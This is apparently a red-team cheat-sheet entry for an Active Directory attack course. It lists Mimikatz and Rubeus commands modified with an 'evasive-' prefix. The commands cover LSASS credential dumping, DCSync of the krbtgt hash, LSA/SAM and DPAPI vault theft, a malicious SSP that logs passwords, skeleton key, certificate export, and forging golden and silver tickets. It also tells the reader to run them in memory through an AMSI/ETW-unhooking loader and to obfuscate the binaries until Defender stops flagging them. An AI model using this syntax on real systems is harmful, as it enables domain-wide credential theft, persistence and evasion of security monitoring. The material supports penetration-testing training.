name: Evasive Mimikatz / Rubeus Verb Reference (via Loader)
description: The CRTP course ships a customized Mimikatz/SafetyKatz whose commands are prefixed 'evasive-' (and Rubeus 'evasive-golden/silver') to avoid signature/behaviour detection. Run them in-memory through Loader.exe. This is the exact syntax used against Defender/MDE in the lab and exam - keep it handy.

variations.label: Elevate token + read DPAPI vault creds

notes:
Verb map (evasive- prefix on the CRTP custom build):
- sekurlsa::evasive-logonpasswords / evasive-keys / evasive-ekeys - creds & Kerberos keys from LSASS (T1003.001)
- sekurlsa::evasive-pth - pass-the-hash into a new logon session
- lsadump::evasive-dcsync /user:<domain>\krbtgt - pull krbtgt/any hash via replication (feeds golden ticket)
- lsadump::evasive-lsa /patch  |  lsadump::evasive-sam - LSA secrets / local SAM
- lsadump::evasive-trust /patch - inter-realm trust keys (feeds cross-domain/forest tickets)
- token::evasive-elevate + vault::cred /patch - elevate then dump Credential Manager/DPAPI vault (scheduled-task creds etc.)
- misc::memssp - register a malicious SSP so future logons are logged in plaintext to C:\Windows\System32\mimilsa.log (credential-capture persistence)
- misc::skeleton - skeleton key (see crtp-skeleton-key)
- crypto::certificates /export - export machine/user certificates (cert theft / PKINIT)
- Rubeus evasive-golden / evasive-silver - forge tickets in-memory
Always run through crtp-loader (ETW/AMSI unhook). If a verb still gets flagged, obfuscate the binary (crtp-tool-obfuscation) and re-check with DefenderCheck.

references.title: MITRE ATT&CK T1003 - OS Credential Dumping
